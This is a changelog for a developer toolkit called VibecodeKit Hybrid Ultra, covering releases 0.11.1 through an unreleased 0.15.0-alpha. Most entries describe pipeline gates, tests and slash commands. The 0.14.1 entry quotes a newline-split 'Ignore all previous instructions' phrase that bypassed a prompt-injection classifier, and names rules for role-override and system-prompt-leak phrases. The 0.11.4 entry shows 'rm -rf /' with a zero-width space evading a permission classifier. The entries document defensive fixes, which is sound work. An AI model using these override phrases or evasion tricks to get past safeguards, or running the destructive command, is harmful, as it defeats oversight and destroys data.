# Changelog

All notable changes to VibecodeKit Hybrid Ultra are listed here.  The
format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/)
and [Semver](https://semver.org/).

## [Unreleased] — v0.15.0-alpha (PR-A — pipeline wiring T1 + T2 + T8)

First slice of the **"One Pipeline, Zero Dead-Code"** rollout
(`docs/INTEGRATION-PLAN-v0.15.md`).  No version bump yet; the canonical
`VERSION` file stays at `0.14.1` until PR-D closes the cycle (T10).

### Added

* **`scripts/vibecodekit/session_ledger.py`** — append-only JSONL ledger
  of completed gates, written to `.vibecode/session_ledger.jsonl`.
  Concurrent appenders are POSIX-atomic; reads tolerate truncated /
  corrupt rows.  3 public functions (`record_gate`, `gates_run`,
  `clear`) + a stable `LEDGER_PATH` constant.
* **`team_mode` CLI subcommands** — `check` (asserts required gates ran,
  exit 2 on `TeamGateViolation`), `record --gate <name>` (appends to
  ledger), `clear` (wipe).  `--gates-run` flag overrides the ledger for
  one-shot CI checks.
* **`tests/touchfiles.json`** — diff-based test selection map for VCK-HU
  itself (16 entries; `test_docs_count_sync` + `test_content_depth`
  marked `always_run: true`).
* **Audit probes #78 / #79 / #80** — pin the new wiring as conformance
  invariants.  Probe #78 verifies `/vck-ship` Bước 0 calls `team_mode
  check` + Bước 7 clears.  #79 verifies `eval_select` is invoked from
  both `/vck-ship` Bước 2 and `.github/workflows/ci.yml` (with
  `fetch-depth: 0`).  #80 round-trips `session_ledger`.
* **18 new regression tests** (`tests/test_session_ledger.py` — 7;
  `tests/test_pipeline_v015_alpha.py` — 11).
* **USAGE_GUIDE §18** — corrected Activation Cheat Sheet (the version
  added in commit `28c69c9` was lost in PR #3 race; this rewrite
  reflects v0.15.0-alpha truth, not v0.14.1 aspiration).
* **README "Activation cheat sheet" table** — links to USAGE_GUIDE §18.

### Changed

* **`/vck-ship` 6-step pipeline → 7-step** (Bước 0 + Bước 7 added).
  Bước 0 is a team-mode preflight (no-op when `.vibecode/team.json` is
  absent); Bước 7 wipes the session ledger after the PR is open.
  Bước 2 now invokes `eval_select` when `tests/touchfiles.json` is
  present, falling back to the full `pytest tests` suite otherwise.
* **`/vck-review`, `/vck-qa-only`, `/vck-learn`** now record their own
  completion via `python -m vibecodekit.team_mode record --gate <name>`
  so `/vck-ship` Bước 0 can see them.
* **`.github/workflows/ci.yml`** runs an `eval_select` preview step on
  every PR + push (visibility-only — full pytest is still the gate).
  `fetch-depth: 0` is now required for the merge-base computation.

### Fixed (audit-correctness)

* USAGE_GUIDE §18 + README cheat sheet were silently lost when the PR
  #3 merge raced with the docs commit `28c69c9`.  Restored with
  truthful wording (no aspirational claims about features that hadn't
  shipped yet).

### Verification

* `pytest tests` — 554 passed (was 536 on 0.14.1; +18 new cases).
* `conformance_audit --threshold 1.0` — 80/80 @ 100 % (was 77/77).
* `validate_release_matrix.py` — L1 + L2 + L3 PASS.
* CI: 3.9 / 3.11 / 3.12 — pending (this commit triggers).

The remaining tasks (T3 learnings session_start auto-inject, T4
classifier auto-on, T5 scaffold seeds, T6 master `/vck-pipeline`
command, T7 orphan-module probe, T9 broader integration probes, T10
version bump) are deferred to PR-B / PR-C / PR-D per the integration
plan.

## [0.14.1] — RRI-T deep audit fixes (P0 + P1 from v0.14.0 audit cycle)

Cycle hardening pass after the v0.14.0 merge.  The deep RRI-T audit
(5 personas × 7 dimensions × 8 stress axes per
``RRI-T_METHODOLOGY.docx``) surfaced **1 P0 + 4 P1** defects in the new
modules.  All five are fixed here with regression tests pinned in
``tests/test_v014_audit_fixes.py`` (19 cases).

### Fixed

* **P0 — `team_mode.write_team_config` race condition (COLLAB axis).**
  The previous implementation rendered to a shared ``team.json.tmp``,
  causing concurrent writers (e.g. two Devin sessions running
  ``vibe team-init`` in parallel) to crash on ``os.replace`` with
  ``FileNotFoundError``.  Now uses ``tempfile.mkstemp`` with a unique
  per-writer suffix in the same directory; ``os.replace`` remains
  atomic and last-writer-wins.
* **P1 — `security_classifier` newline-split bypass (D4 + D7).**
  Five injection rules used ``[^.\n]`` to bound their span; attackers
  could split prose across newlines (``Ignore\nall\nprevious\n
  instructions``) and silently bypass.  Span class is now ``[^.]`` so
  newlines are tolerated while sentence boundaries still bound the
  match.  Bumped span limits from 60 → 80 chars (40 → 60 for
  ``pi-system-prompt-leak``) to recover precision lost on the new
  newline allowance.
* **P1 — `security_classifier` LOCALE coverage (axis 8 — Vietnamese).**
  The project is VN-first but the rule bank shipped English-only
  patterns.  Added 4 Vietnamese-language rules (``pi-vn-ignore-prior``,
  ``pi-vn-you-are-now``, ``pi-vn-system-prompt-leak``,
  ``pi-vn-roleplay-override``) with high-precision wording mirroring
  their English counterparts.  Total rule count: 24 → 28.
* **P1 — `team_mode.TeamConfig.from_dict` silent-coercion bug.**
  ``{"required": "oops"}`` was silently iterated as
  ``("o","o","p","s")`` because ``tuple(value)`` accepts any iterable.
  Now rejects non-list/tuple values explicitly with ``ValueError``.
  ``read_team_config`` swallows the new error and returns ``None`` so
  callers fall through to "no team mode" rather than crashing.
* **P1 — `eval_select` empty-patterns silently skipped.** The module
  docstring promised "missing or empty touchfile entries fall back to
  'always run' so a stale map can never cause a test to be silently
  skipped" — but ``{"tests/x.py": []}`` produced exactly that silent
  skip.  Empty patterns lists (``[]`` and ``{"files": []}`` without
  ``always_run``) now promote to always-run, matching the documented
  contract.

### Added

* **`tests/test_v014_audit_fixes.py`** — 19 regression cases pinning
  every fix above so future refactors cannot re-introduce the issues.

### Removed

* **`tests/test_version_sync.py`** — stale pre-v0.11.4 layout test that
  always self-skipped (15 / 15 tests) because the legacy
  ``skill/vibecodekit-hybrid-ultra/`` + ``claw-code-pack/`` directories
  no longer exist.  The version-sync invariant is fully covered by
  ``tests/test_docs_count_sync.py`` (which already gates on the current
  ``update-package/`` layout — it caught the
  ``update-package/.claw.json`` drift in this very release).

### Changed (none)

No public-API breaks.  All 77 conformance probes remain green, full
suite is **536 passed / 0 skipped** (was 517 / 15 — added 19 regression
cases, deleted 15 dead skips).

### Audit report

See ``docs/AUDIT-v0.14.0.md`` for the full RRI-T cycle write-up
including persona coverage, stress-axis matrix, and severity
classification rationale.

## [0.14.0] — gstack integration Phase 3+4 (ML security + plan reviews + polish)

Second gstack-integration release.  Merges Phase 3 (ML security +
plan-review skills) and Phase 4 (polish + community infrastructure)
into a single shipping vehicle.  All 67 v0.12.0 probes remain bit-for-bit
identical; this release adds **10 new probes (#68–#77)** for a total of
**77 / 77 @ 100 %**.

### Added

* **`scripts/vibecodekit/security_classifier.py`** — 3-layer ensemble
  prompt-injection / secret-leak detector.  `RegexLayer` ships in the
  stdlib-only core (24-rule bank covering prompt injection, secret
  leaks across 8 key formats, exfiltration prose, and IMDS access).
  `OnnxLayer` and `HaikuLayer` are optional (`[ml]` extra — adds
  `onnxruntime`, `transformers`, `httpx`).  Both optional layers
  self-disable cleanly when deps or credentials are missing.  Ensemble
  vote is **2-of-3 majority of non-abstainers**; every verdict is
  rendered as a synthetic permission-engine command so
  `permission_engine.classify_cmd` is always on the decision path.
* **`scripts/vibecodekit/eval_select.py`** — diff-based test selection
  with touchfile map.  Supports both list and `{files, always_run}`
  shapes, glob + prefix matching, unmapped-change reporting, and a
  `fallback_all_tests` escape hatch when no changes are detected.
* **`scripts/vibecodekit/learnings.py`** — per-project JSONL learnings
  store with 3-tier scope (user / project / team), atomic
  fcntl-locked appends, corrupt-line tolerance, and a cross-scope
  `load_all` merge helper.
* **`scripts/vibecodekit/team_mode.py`** — `.vibecode/team.json`
  coordination file (required gates / optional gates /
  learnings_required), atomic write, and
  `assert_required_gates_run()` enforcement.
* **8 new `/vck-*` specialist slash commands**:
  - `/vck-office-hours` — YC-style 6 forcing questions
    (PMF / hurt / why-now / moat / distribution / ask).
  - `/vck-ceo-review` — 4-mode review (SCOPE EXPANSION /
    SELECTIVE / HOLD / REDUCTION).
  - `/vck-eng-review` — lock architecture with 7-item gate
    (ASCII diagram, state machine, invariants, contracts,
    error taxonomy, observability, backwards-compat).
  - `/vck-design-consultation` — build design system from zero
    (tokens → components → patterns → flows, VN-first).
  - `/vck-design-review` — UI drift audit + atomic fix loop.
  - `/vck-learn` — capture one learning to JSONL (scope aware).
  - `/vck-retro` — weekly retro (Keep / Stop / Try) + 3 action
    commits.
  - `/vck-second-opinion` — delegate plan/code review to a
    different CLI (Codex / Gemini / Ollama) via the permission
    engine.
* **Optional ML security hook wiring** — `pre_tool_use.py` calls
  `security_classifier.classify_text` when `VIBECODE_SECURITY_CLASSIFIER=1`.
  Off by default; upgrades an existing `allow` decision to `deny` when
  the ensemble detects prompt injection / secret leak / exfiltration.
  The hook never crashes the permission path: classifier errors are
  reported as metadata, decision falls back to the permission engine.
* **10 new conformance probes (#68–#77)**:
  - #68 classifier ensemble contract — synthetic command goes through
    `classify_cmd`.
  - #69 regex rule bank — ≥ 3 kinds + unique ids.
  - #70 blocks prompt injection (3 classic samples).
  - #71 blocks secret leak (AWS / GitHub / PEM).
  - #72 optional layers abstain without deps / credentials.
  - #73 eval_select — exact + glob + always_run + unmapped report.
  - #74 learnings JSONL round-trip across user / team / project.
  - #75 team_mode required-gate enforcement raises + clears.
  - #76 GitHub Actions CI workflow present + gates pytest + audit.
  - #77 `CONTRIBUTING.md` + `USAGE_GUIDE.md §17 browser` present.
* **`.github/workflows/ci.yml`** — pytest + conformance audit +
  release-matrix gate across Python 3.9 / 3.11 / 3.12.
* **`CONTRIBUTING.md`** — VN-first contributing guide with the
  mandatory quality gates spelled out.
* **`USAGE_GUIDE.md §17 browser`** — end-user docs for the v0.12
  browser daemon and its relationship to the new `[ml]` extra.
* **Tests** (+~500 LOC, ≥ 60 new cases): `tests/test_security_classifier.py`
  (regex coverage, optional-layer self-disable, ensemble majority,
  permission-engine integration), `tests/test_eval_select.py`
  (both touchfile shapes, glob, always_run, unmapped, bad shape
  rejection), `tests/test_learnings_and_team.py` (round-trip,
  corrupt-line tolerance, concurrent append via threads, team
  config round-trip + enforcement), and `tests/test_vck_skills_v014.py`
  (manifest / SKILL.md / intent_router / subagent_runtime wiring).

### Changed

* `pyproject.toml` — version → 0.14.0; `[ml]` extra now pins
  `onnxruntime`, `transformers`, `httpx`.  `markers` adds an `ml`
  pytest marker.
* `manifest.llm.json`, `SKILL.md`, `scripts/vibecodekit/intent_router.py`,
  `scripts/vibecodekit/subagent_runtime.py` — wire the 8 new
  slash commands, 8 new intents, and 8 new command → agent bindings
  without touching any of the 26 existing `/vibe-*` or 7 existing
  `/vck-*` commands.
* `VERSION`, `update-package/VERSION`, `assets/plugin-manifest.json`,
  `update-package/.claw.json` — bumped to 0.14.0.

### Metrics

* **Tests**: 459 → 519 passed, 15 skipped.
* **Conformance audit**: 67/67 → **77/77 @ 100 %**.
* **Release matrix**: L1 (source) + L2 (zip) + L3 (installed project)
  all PASS.
* **Core deps**: still stdlib-only.  `[ml]` is opt-in; default
  installations are unchanged.

### Attribution

Phase 3 + 4 architecture inspired by
[gstack](https://github.com/garrytan/gstack) (© Garry Tan, MIT,
commit `675717e3`).  Clean-room Python re-implementation; no gstack
source is copied.  See `LICENSE-third-party.md` for the full
attribution manifest and SHA pinning.

## [0.12.0] — gstack integration Phase 1+2 (browser daemon + 6 specialist skills)

First minor release after v0.11.4.1.  Introduces the first round of
features adapted (with attribution) from
[gstack](https://github.com/garrytan/gstack) (© Garry Tan, MIT,
commit `675717e3`) — see `LICENSE-third-party.md` for the full
attribution manifest.

### Added

* **`LICENSE` (MIT) + `LICENSE-third-party.md`** — the repo is now
  explicitly MIT-licensed.  The third-party file enumerates every
  gstack-adapted artefact with commit SHA and scope.
* **`pyproject.toml`** — PEP 621 metadata.  Core remains stdlib-only;
  `[browser]` / `[ml]` / `[dev]` / `[all]` optional extras are
  introduced to isolate the new third-party dependencies behind
  explicit opt-in.
* **Browser daemon (`scripts/vibecodekit/browser/`, ~1.5 kLOC Python)**
  — clean-room reimplementation of gstack's persistent-daemon
  architecture.  9 modules: `state` (atomic 0o600 state file +
  idle-timeout), `security` (datamarking envelope + hidden-element
  strip + bidi/ctrl-char sanitisation + URL blocklist),
  `permission` (bridge to the existing permission engine — every
  browser command is classified), `snapshot` (ARIA tree +
  stable-hash DOM diff), `commands_read` / `commands_write`
  (verb executors with swappable runners — testable without
  playwright installed), `cli_adapter` (stdlib-only HTTP client),
  `manager` + `server` (playwright + FastAPI, extras-only).
* **7 specialist slash commands (`/vck-cso`, `/vck-review`, `/vck-qa`,
  `/vck-qa-only`, `/vck-ship`, `/vck-investigate`, `/vck-canary`)**
  — Vietnamese-first adaptations of the corresponding gstack
  skills.  Each command file carries an `inspired-by:` frontmatter
  line pointing at the gstack source commit.
* **2 new agent roles (`reviewer`, `qa-lead`)** — read-only agents
  wired into `subagent_runtime.PROFILES` and
  `DEFAULT_COMMAND_AGENT`.
* **`references/40-ethos-vck.md`** — ETHOS adaptation (Boil the
  Lake / Search Before Building / User Sovereignty / Build for
  Yourself) mapped onto the VIBECODE-MASTER 8-step workflow.
* **Intent router (+6 VCK-\* intents)** — high-specificity phrases
  only, so generic "review" / "ship" / "qa" prose still routes to
  the existing `/vibe-*` pipeline.
* **Audit probes #54 – #67** — 9 browser-layer probes and 5 skill-v2
  probes; the conformance audit is extended from 53 to 67 without
  modifying any existing probe.
* **Tests (`tests/browser/`, 46 new cases)** — atomic-write guard,
  0o600 permissions, envelope wrap, hidden-element strip,
  bidi/ctrl-char strip, URL blocklist (loopback allowed, IMDS
  refused), permission-engine pipeline verification.

### Changed

* **`SKILL.md`, `manifest.llm.json`, `update-package/VERSION`,
  `update-package/.claw.json`, `assets/plugin-manifest.json`,
  root `VERSION`** — version bumped to `0.12.0` and the 7 new
  `/vck-*` triggers listed under `triggers:`.

### Migration notes

Existing users see **no runtime change** unless they explicitly
opt in to `pip install "vibecodekit-hybrid-ultra[browser]"`.  All
26 existing `/vibe-*` commands and all 53 existing audit probes
remain bit-identical.

## [0.11.4.1] — Root-safe tests & canonical gate clarification

Test-harness and release-gate polish only; runtime is bit-identical
to v0.11.4.  This patch exists because the v0.11.4 zips were already
distributed and two reviewer-environment issues needed an explicit
fix-or-document decision:

### Fixed

* **`tests/test_cli_error_hygiene.py::test_install_into_readonly_dir`
  failed under `root`.**  Root on POSIX bypasses discretionary
  `chmod 0400`, so the test's "install into chmod-read-only dir" path
  no longer surfaced a `PermissionError` and the `assert rc == 1` hit.
  The test is now marked `@pytest.mark.skipif(os.geteuid() == 0)`
  with a short reason string.  The sibling test
  `test_install_into_file_where_dir_expected_emits_clean_json_error`
  already covers the same surface (clean JSON error on an unhappy
  filesystem path) deterministically for both root and non-root
  callers, so no coverage is lost.

### Changed

* **`tools/validate_release_matrix.py` — canonical gate clarified.**
  The matrix script is layout-matrix only; `pytest` is **not** part
  of the canonical matrix gate.  `--with-pytest` is retained as an
  **optional, non-canonical** shortcut (with a `[NON-CANONICAL /
  OPTIONAL]` argparse help marker) and the module docstring now
  documents that nested-container / PTY-less CI environments have
  been observed to hang the pytest subprocess until the 180s budget
  trips.  **Canonical release gate (v0.11.4.1+)** is:
    1. `python -m pytest tests -q` (run directly)
    2. `python tools/validate_release_matrix.py --skill X --update Y`
  Reviewers should prefer running pytest directly.
* **`_run` helper uses `stdin=subprocess.DEVNULL`.**  Defence-in-depth
  against interactive-input prompts inside subprocesses that may
  otherwise block waiting on a live-ish stdin inherited from a
  nested tty.

### Verified

* pytest under `uid=1000`: **367 passed, 15 skipped** (matches v0.11.4).
* pytest under `uid=0` (root): **366 passed, 16 skipped** (+1 skip
  for the now-gated readonly test, expected and explicit).
* audit: 53/53 met=True.
* audit --json: 53/53 met=True.
* `validate_release_matrix.py` default: PASS in 2.1s.
* `validate_release_matrix.py --with-pytest` (non-canonical): PASS
  in 6.7s in the author's VM; may hang in other environments, see
  docstring.

## [0.11.4] — Stress-dipdive polish (P3 + Obs follow-ups)

Defensive hardening pass after the v0.11.3.1 RRI-T stress/dipdive
(7 dimensions × 8 stress axes) surfaced 3 P3 items and 2
observations.  No runtime-architecture change and no feature work.

### Added

* **Obs-1 — dedicated RRI question banks for `api` / `crm` / `mobile`.**
  `assets/rri-question-bank.json` (schema bumped to 1.2.0) now carries
  three new buckets, 30 questions each, balanced across 5 personas × 3
  modes.  Aliases wire `api-todo → api`, `rest-api → api`,
  `backend → api`, `mobile-app → mobile`, `expo → mobile`,
  `react-native → mobile`, `rn → mobile`, `crm-app → crm`, `sales → crm`.
  These presets used to fall back to the 16-question `custom` bank
  (flagged in the v0.11.3.1 stress-dipdive report as "interview too
  shallow for SaaS-grade intake").
* **Obs-2 — Vietnamese-first posture documented** on
  `load_rri_questions`.  Docstring now states explicitly that
  personas/modes/IDs are structural and locale-agnostic, while the
  `q` text is VN-first (matching VIBECODE-MASTER's primary audience)
  and downstream LLMs are expected to translate on render.

### Changed — hardening

* **P3-1 — concurrent-install serialisation.**  `install_manifest.install`
  now wraps plan-and-apply in an advisory `fcntl` lock scoped to
  `<dst>/.vibecode/runtime/install.lock`.  Two parallel installers on
  the same destination no longer race: the second caller blocks
  briefly, then re-plans against the committed filesystem and
  reports all files as idempotent skips.  `dry_run=True` skips the
  lock (no side effect).  Windows fallback is a no-op (`fcntl`
  unavailable), preserving cross-platform `install()` semantics.
* **P3-2 — CLI error hygiene.**  `_cmd_install` and `_cmd_scaffold`
  now translate `PermissionError`, `FileExistsError`,
  `IsADirectoryError`, `NotADirectoryError`, generic `OSError`
  (with `errno`), and (for scaffold) `ValueError` into a single JSON
  diagnostic on stderr plus `exit 1`.  Users pointing `install` at
  a read-only volume or `scaffold preview` at an unknown preset no
  longer see a raw traceback.
* **P3-3 — Cf-category Unicode strip in permission classifier.**
  `permission_engine._normalise_unicode` now removes all Unicode
  characters with category `Cf` (zero-width, BOM, SOFT HYPHEN,
  WORD JOINER, …) after NFKC normalisation and before dash folding.
  `rm\u200b -rf /` (ZWS between `rm` and space) now classifies as
  `blocked`; the stress-dipdive report flagged this as a
  defense-in-depth gap (original exploit was mitigated by the
  approval prompt but not by the classifier).

### Verified

* pytest: 354+ passed, 15 skipped, 0 failed (incl. new regression
  smokes for the ZWS bypass and CLI error hygiene)
* audit: 53/53 met=True
* validate_release_matrix default + `--with-pytest`: PASS
* fresh install + doctor: exit 0

## [0.11.3.1] — Docs/tooling finalize

Reviewer-driven REFINE pass on the v0.11.3 release surface.  Runtime is
unchanged; this only fixes docs drift the v0.11.3 HOTFIX-005 pass missed
and hardens the release-gate script so it can never hang.

### Fixed — docs sweep (REFINE-001)

* **README / QUICKSTART / USAGE_GUIDE / SKILL / CLAUDE** — normalise
  current-release user-facing prose: `v0.11.0/v0.11.2/...` in download
  URLs → `v0.11.3.1`; `39 / 47 / 50 conformance probes` → `53 probes`;
  `526 tests / 284 passed` → "all actionable tests pass"; `7 preset × 3
  stacks` → `10 preset × 3 stacks`; `50/50 PASS` → `53/53 PASS`.
* **SKILL.md** — relabel the "v0.11.2 content depth" section as
  `(historical)` and reword the conformance-audit sentence to make it
  clear the 50-probe count was the historical state at v0.11.2 and the
  current audit runs 53 probes.
* **USAGE_GUIDE.md** — relabel the "v0.11.0/v0.11.2 BIG-UPDATE" section
  as `v0.11.x BIG-UPDATE history` in both skill and update copies so
  they no longer read as current-release claims.
* **update-package** `.claw.json` version bumped to `0.11.3.1`.

### Fixed — regression guard (REFINE-002)

* `tests/test_docs_count_sync.py`
  - scan both the skill bundle docs **and** the sibling update-package
    docs (`README.md`, `QUICKSTART.md`, `USAGE_GUIDE.md`, `CLAUDE.md`);
  - expanded `STALE_PATTERNS` with the reviewer-specified drift regex
    list (intermediate probe counts 44/47/50, `526 tests`, `7 preset`
    variants, legacy `v0.11.0/v0.11.2` download names);
  - strip-heuristic now skips entire per-version sections
    (`## v0.11.2 ...`) and sections explicitly tagged `(historical)`
    instead of only the heading line, so historical content can no
    longer leak past the guard;
  - added a top-of-CHANGELOG.md sanity test that asserts the top
    section mentions the current `VERSION`.

### Fixed — release gate tooling (REFINE-003)

* `tools/validate_release_matrix.py` now runs each step via
  `subprocess.Popen(start_new_session=True)` with a hard per-command
  timeout and `os.killpg(..., SIGKILL)` on expiry — it can never hang;
* reports `[TIMEOUT] <label>` instead of silent stalls;
* adds `--fast` to skip the pytest layer when reviewers only want to
  validate the fresh-install flow.

### Known caveats

* No runtime behaviour change vs v0.11.3 — pytest, audit, installer,
  doctor, scaffolds, methodology, MCP are byte-identical at the
  behaviour level; only version strings, docs prose, and the
  release-gate tool moved.

---

## [0.11.3] — Wiring patch + packaging correctness hotfix

Closes the three structural wiring gaps the v0.11.2 deep-dive surfaced
(references not loaded into runtime, agents manual-only, `paths:`/`triggers:`
metadata declared but never consumed) **and** the seven install-surface
release blockers caught in the v0.11.3 VERIFY cycle.

### Fixed — packaging / install (post-VERIFY hotfixes 001-009)

* **HOTFIX-001 / 009 — installer copies runtime assets at the right paths.**
  `install_manifest.plan()` now ships `assets/rri-question-bank.json`,
  `assets/scaffolds/**`, `assets/templates/**` (preserving the `assets/`
  prefix so probes and `methodology` resolve them correctly), plus
  `manifest.llm.json`, `VERSION`, and `CHANGELOG.md` into
  `ai-rules/vibecodekit/`.  A legacy mirror at `ai-rules/vibecodekit/templates/`
  is retained for v0.11.2 backwards-compat.
* **HOTFIX-002 — `doctor` validates required runtime assets.**  New
  `REQUIRED_RUNTIME_ASSETS` list covers the question bank, three scaffold
  presets, style/copy references, and the vision/rri-matrix templates.
  `doctor --installed-only` now returns exit 1 with a clear warning when
  any are missing post-install.
* **HOTFIX-004 — `vibe audit --json` accepted.**  The flag is a no-op
  (audit output is already JSON), kept so older docs / CI scripts don't
  break.
* **HOTFIX-005 — current-release docs synced.**  `README.md`,
  `QUICKSTART.md`, `USAGE_GUIDE.md`, `SKILL.md` updated from stale
  `24 slash commands` / `39 / 39 probes` / `526 / 526` / `284 passed`
  to reality (`26 slash commands`, `53 / 53 probes`, actionable-test
  wording).  New `tests/test_docs_count_sync.py` grep regression guard
  prevents future drift (skips historical changelog entries).
* **HOTFIX-006 — root-safe dashboard error test.**
  `test_dashboard_html_permission_error_clean` now writes into a
  directory-as-file target via `tmp_path` so it fails deterministically
  under any UID including root containers (no more `/etc/nope.html`).
* **HOTFIX-007 — 3-layout release gate.**  New
  `tools/validate_release_matrix.py` runs pytest + audit on the source
  bundle, then mirrors update-package into a temp project, installs,
  and re-audits from the installed location.  Fails fast if any layout
  drops below 100 % parity.
* **Version sync.**  `VERSION` file and `plugin-manifest.json` bumped to
  `0.11.3` (were stale `0.11.2`); `mcp_servers/selfcheck.py` serverInfo
  bumped from `0.11.0` to `0.11.3`.
* **`test_audit_from_fresh_install` rewired.**  It now actually performs
  the documented install flow (mirror update-package → `vibe install` →
  audit at threshold 1.0) rather than running audit against an empty
  directory; skips gracefully when no update-package is available.

No core runtime behaviour changes in this hotfix track.

### Added — Patch A (references → prompts)

* `methodology.load_reference(ref_id)` — read `references/NN-*.md` body.
* `methodology.load_reference_section(ref_id, heading)` — extract one
  `## …` / `### …` section (case-insensitive heading match).
* `methodology.render_command_context(command, *, project_type, persona,
  mode, max_questions)` — compose wired refs + dynamic data
  (`recommend_stack`, `load_rri_questions`) into a single LLM-ready
  prompt block.  Eleven slash commands wired
  (`vibe-vision`, `vibe-rri`, `vibe-rri-ui`, `vibe-rri-ux`, `vibe-rri-t`,
  `vibe-blueprint`, `vibe-verify`, `vibe-refine`, `vibe-audit`,
  `vibe-module`, `vibe-scaffold`).
* `vibe context --command <name> --project-type … --persona … --mode-filter …`
  CLI.
* `.claude/commands/*.md` — added `wired_refs:` frontmatter +
  ``<!-- v0.11.3-runtime-wiring-begin -->`` body block to every wired
  command.

### Added — Patch B (agent auto-spawn)

* `subagent_runtime.DEFAULT_COMMAND_AGENT` — slash command → role map
  (`vibe-blueprint→coordinator`, `vibe-scaffold/vibe-module→builder`,
  `vibe-verify→qa`, `vibe-audit→security`, `vibe-scan→scout`).
* `subagent_runtime.resolve_command_agent(command, commands_dir=…)` —
  frontmatter `agent:` field overrides defaults.
* `subagent_runtime.spawn_for_command(root, command, objective)` — drop-in
  replacement for `spawn(role, …)` that resolves the role from the
  command name.
* Six slash commands now declare `agent:` in frontmatter
  (`vibe-blueprint`, `vibe-scaffold`, `vibe-module`, `vibe-verify`,
  `vibe-audit`, `vibe-scan`).

### Added — Patch C (paths-based lazy-load)

* `skill_discovery.activate_for(path)` — walks SKILL.md `paths:` globs
  with proper recursive `**/` semantics; returns `{activate, skill,
  matched, reason}`.
* `.claw/hooks/pre_tool_use.py` — emits non-blocking `skill_activation`
  signal alongside the permission decision when the host passes a
  `path:` in the tool payload.  Advisory only; never blocks the tool.
* `vibe activate <path>` CLI.

### Added — Conformance + tests

* Three new probes: #51 `command_context_wiring`, #52
  `command_agent_binding`, #53 `skill_paths_activation`.  Audit:
  **53/53 PASS** at 100% threshold.
* `tests/test_content_depth.py` — 32 new tests covering A/B/C.
  Pytest: **124 passed, 15 skipped**.

### Changed

* SKILL.md — bumped to `version: 0.11.3`; new "v0.11.3 wiring patch"
  section.
* `manifest.llm.json` — `version: 0.11.3`.
* `__init__.py` / `mcp_client.py` — `_FALLBACK_VERSION` /
  `client_version` strings bumped to `0.11.3`.

## [0.11.2] — Content depth (Builder TIP-FIX-001..007)

Closes the 5 remaining content/depth gaps identified in cycle-2 review:
P4 (stack pre-fill), P5 (RRI bank), M4 (docs scaffold), M6 (style tokens),
M7 (copy patterns).  No core runtime behaviour changes.

### Added — TIP-FIX-001 (docs intent routing)

* `intent_router.py` BUILD intent now matches Vietnamese / English docs
  triggers (`docs`, `tài liệu`, `documentation`, `nextra`, `docusaurus`,
  `knowledge base`, `developer documentation`, …).  Existing 9 scaffold
  routes are unchanged.
* New conformance probe **#50 docs_intent_routing** asserts the three
  canonical docs-prose strings classify to `BUILD`.

### Added — TIP-FIX-002 (project-type stack recommendations)

* `methodology.PROJECT_STACK_RECOMMENDATIONS` — canonical 11-type matrix
  (`landing`, `saas`, `dashboard`, `blog`, `docs`, `portfolio`,
  `ecommerce`, `mobile`, `api`, `enterprise-module`, `custom`).
* `methodology.recommend_stack(project_type)` with alias resolution
  (`landing-page` → `landing`, `documentation` → `docs`, `backend` → `api`,
  `module` → `enterprise-module`, …) and **safe fallback to `custom`**
  for unknown inputs (`unknown=True` flag in result).
* `assets/templates/vision.md` "Proposed stack" table now contains
  pre-filled rows for every supported project type (incl. mobile / api
  / custom) and a "Style direction" section pointing at FP-/CP- IDs and
  CF-IDs for the new copy reference.
* New conformance probe **#49 stack_recommendations** asserts coverage.

### Added — TIP-FIX-003 (RRI question bank by persona × mode)

* `assets/rri-question-bank.json` v1.1.0 — **293 canonical questions**,
  9 project types, 5 personas, 3 modes:
    | Project type      | min | actual |
    |-------------------|-----|--------|
    | landing           |  25 |  26    |
    | saas              |  50 |  51    |
    | dashboard         |  35 |  35    |
    | blog              |  25 |  25    |
    | docs              |  30 |  30    |
    | portfolio         |  25 |  25    |
    | ecommerce         |  40 |  40    |
    | enterprise-module |  45 |  45    |
    | custom            |  15 |  16    |
* `methodology.load_rri_questions(project_type, persona=None, mode=None)`
  — extended signature; alias resolution; safe fallback to `custom` for
  unknown project types.  `VALID_RRI_PERSONAS` and `VALID_RRI_MODES`
  exported as canonical tuples.
* `assets/templates/rri-matrix.md` — re-templated with persona × mode
  coverage check table; per-cell "must be ≥ 1 question asked" guarantee
  before VISION sign-off.

### Added — TIP-FIX-004 (Vietnamese-first style tokens)

* `references/34-style-tokens.md` §3 (NEW) — 12 canonical
  Vietnamese-first typography rules **VN-01..VN-12** (line-height ≥ 1.6,
  font subsets, layout rhythm, no uppercase Vietnamese, …).  FP-/CP-
  rosters are unchanged at 6/6.

### Added — TIP-FIX-005 (copy-pattern reference split)

* `references/36-copy-patterns.md` (NEW) — extracts and extends Phụ Lục D:
  CF-01..CF-09 (headlines, CTA, social-proof, **pricing**, **empty state**,
  **error state**) plus 8 Vietnamese copy rules **CF-VN-01..CF-VN-08**.
* `methodology.COPY_PATTERNS` extended to 9 entries; new
  `methodology.COPY_PATTERNS_VN` (8 entries).  `lookup_style_token`
  routes `CF-*` IDs through unchanged.
* `references/34-style-tokens.md` §3 (old "copy formulas") removed —
  ref-34 now points readers at ref-36 for copy.
* New conformance probe **#48 copy_patterns_canonical**.

### Added — TIP-FIX-006 (manifest / docs sync)

* `SKILL.md` — bumped to v0.11.2; mentions docs scaffold, VN-typography,
  copy patterns; lists `assets/rri-question-bank.json` in the runtime
  data section.
* `references/00-overview.md` — appended a "v0.11.x extension references"
  section (refs 30–36) and a "Runtime data" section pointing at the
  question bank.
* `manifest.llm.json` — `version: 0.11.2`; added `assets/rri-question-bank.json`
  and `references/36-copy-patterns.md` under `references` and
  `runtime_assets`.
* `assets/scaffolds/docs/` (introduced in v0.11.1) — kept as-is; installer
  auto-discovers it via `install_manifest.plan()`, no manifest list to
  update.

### Added — TIP-FIX-007 (regression tests)

* `tests/test_content_depth.py` — pytest suite covering FIX-001..005
  (intent routing, stack recommendations + safe fallback, question bank
  thresholds + persona/mode filter, VN typography rule presence,
  copy-pattern reference symmetry).
* New conformance probes **#48, #49, #50** registered (totals: **50/50**
  at 100% threshold).

## [0.11.1] — 2026-04-27 (Post-cycle-2 review fixes)

Closes findings from `auto-review-v011-vs-v5-cycle2.md`.

### Fixed (MEDIUM)

* **F5** — `conformance_audit` probes `40_refine_boundary_step8` and
  `44_enterprise_module_workflow` no longer hard-code
  `claw-code-pack/.claude/commands/...`.  New `_find_slash_command()`
  helper tries 5 canonical layouts (sibling update-package, monorepo,
  cwd, env-var override).  Now passes after extracting the skill bundle
  alone.
* **F1** — Changelog entry for v0.11.0 + v0.11.1 (this entry) — closes
  the gap noted in cycle-2 §F1.
